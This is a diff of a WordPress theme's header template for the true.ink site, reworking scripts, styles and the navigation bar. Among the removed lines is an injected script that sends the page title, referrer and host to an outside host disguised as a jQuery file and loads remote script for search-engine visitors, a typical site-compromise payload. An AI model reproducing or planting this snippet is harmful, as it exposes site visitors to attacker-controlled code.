@@ -22,7 +22,6 @@ $transitionTime = ot_get_option("transitiontime");
 		    <link href='http://fonts.googleapis.com/css?family=Source+Code+Pro:200,300,400,500,600,700' rel='stylesheet' type='text/css'>
 
 		<style>
-		.cart {display:none}
 			.fp-easing {
 			    -webkit-transition: all <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000) !important; /* Safari<=6 Android<=4.3 */
 			    transition: all <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000) !important;
@@ -50,49 +49,6 @@ $transitionTime = ot_get_option("transitiontime");
   ga('send', 'pageview');
 
 </script>
-<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js"></script>
-<script type="text/javascript" src="js/jquery.fullPage.js"></script>
-<script type="text/javascript">
-$(window).load(function() {
-    $('#fullpage').fadeIn(1000);
-});
-</script>
-<!-- VIDEO JS -->
-<script src="js/video-js/video.js"></script>
-<script>
-	videojs.options.flash.swf = "js/video-js/video-js.swf";
-</script>
-<!-- FULLPAGE -->
-<script type="text/javascript">
-    $(document).ready(function() {
-        $('#fullpage').fullpage({
-            verticalCentered: true,
-            afterRender: function(){
-
-
-                //playing the video
-                $('video').get(0).play();
-            }
-        });
-    });
-</script>
-<style media="screen" type="text/css">
-.dummy-menu {display:none}
-/* VIDEO FIX */
-@media only screen and (max-width : 768px) {
-	#video-bg video{
-		display:none;
-	}
-	#video-bg{
-		background-image:url(images/horseloophome_poster.jpg);
-		background-size:cover;
-		background-size:auto 100%;
-		background-position:center center;
-		min-height:100%;
-	}	
-}
-</style>
-
 		<script src="//use.typekit.net/lla6fei.js"></script>
     <script>try{Typekit.load();}catch(e){}</script>   
 		<script src="https://js.gleam.io/oi-aTlB1xi7.js" async="async"></script>
@@ -101,56 +57,47 @@ $(window).load(function() {
 
 		<?php wp_head(); ?>
 
-	
-
-
-
-
-<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://moriturus-bw.pytalhost.de/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
-</head>
+	</head>
 
 	<body <?php body_class(); ?>>
 
 	<!-- SHARE MODAL -->
 	
-<div id="page" class="hfeed site">
+
+	<div id="page" class="hfeed site">
 		
-		<?php 
+		<div style="background-color:#000; z-index:99999; line-height:1!important;height:50px">
+  <a class="navbar-brand" style="z-index:99999;" href="http://true.ink"></a>
 
-		if(is_single()) {
-			$color = get_field('menu_color',get_the_id())?'background-color:'.get_field('menu_color',get_the_id()):'';
-		}
-		else {
-			$color = '';
-		}
+			<nav role="navigation" class="site-navigation main-navigation block">
+												<div style="float:right; margin:5px 5px 0 0;">
+												
+<a href="http://www.facebook.com/truedotink" target="_blank" class="fa-stack fa-lg" style="margin-right:12px">
+                <i class="fa fa-circle fa-stack-2x" style="font-size: 3em !important"></i>
+                <i class="fa fa-facebook fa-stack-1x" style="font-size: 1.5em !important; padding: 8px 11px 0px;"></i>
+            </a>
+            <a href="http://www.twitter.com/truedotink" target="_blank" class="fa-stack fa-lg" style="margin-right:12px; z-index:99999;">
+                <i class="fa fa-circle fa-stack-2x" style="font-size: 3em !important"></i>
+                <i class="fa fa-twitter fa-stack-1x" style="font-size: 1.5em !important; padding: 7px 0px 0px 6px;"></i>
+            </a>   
+            <a href="http://www.instagram.com/truedotink" target="_blank" class="fa-stack fa-lg" style="margin-right:12px; z-index:99999;">
+                <i class="fa fa-circle fa-stack-2x" style="font-size: 3em !important"></i>
+                <i class="fa fa-instagram fa-stack-1x" style="font-size: 1.5em !important; padding: 7px 0px 0px 6px;"></i>
+            </a> 
+            <a href="http://true.ink/mission.php" target="_blank" class="fa-stack fa-lg" style="margin-right:12px; z-index:99999;">
+                <i class="fa fa-circle fa-stack-2x" style="font-size: 3em !important"></i>
+                <i class="fa fa-info fa-stack-1x" style="color:black!important; font-size: 1.5em !important; padding: 7px 0px 0px 6px"></i>
+            </a>
+                        <!-- a href="http://eepurl.com/bngDnH" target="_blank" class="fa-stack fa-lg">
+            <i class="fa fa-circle fa-stack-2x"></i>
+            <i class="fa fa-envelope fa-stack-1x"></i></a -->
+            <!-- h1 class="assistive-text"><?php _e( 'Menu', 'full_frame' ); ?></h1>
+				<div class="assistive-text skip-link"><a href="#content" title="<?php esc_attr_e( 'Skip to content', 'full_frame' ); ?>"><?php _e( 'Skip to content', 'full_frame' ); ?></a></div>
+								<div style="float:right"><?php wp_nav_menu( array( 'theme_location' => 'primary', 'container' => '', 'menu_class' => 'main-menu' ) ); ?> </div -->
 
-		if(is_front_page()) {
-			
-			$color = 'background-color:transparent';
-		}
-
-
-
-		 ?>
-		<div class="true-menu-wrapper headroom" style="<?php //echo $color ?>">
-			<div class="fluid-container">
-				<div class="row">
-					<div class="col-xs-12">
-						<a href="http://true.ink/" class="logo"></a>
-		    			<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class'      => 'hidden-xs','container_class'=>'true-menu true-main-menu' ) ); ?>
-						<a href="#" class="mobile-menu hidden-lg hidden-md hidden-sm">
-							<i class="fa fa-bars fa-6"></i>
-						</a>
-			    	</div>
-			    </div>
-		    </div>
+            </DIV>
+			</nav><!-- .site-navigation .main-navigation -->
+			     
 		</div>
-
-		<nav class="top-custom-menu">
-			<div class="inner">
-				<?php add_filter( 'wp_nav_menu_objects', create_function( '$menu', 'return array_reverse( $menu );' ) ); ?>
-				<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => '','container_class'=>'top-custom-menu-ul true-mobile-menu', 'order'=> 'DESC','orderby' => 'menu_order' ) ); ?>
-			</div>
-		</nav>
-
+		
 		<div id="content" class="site-content">
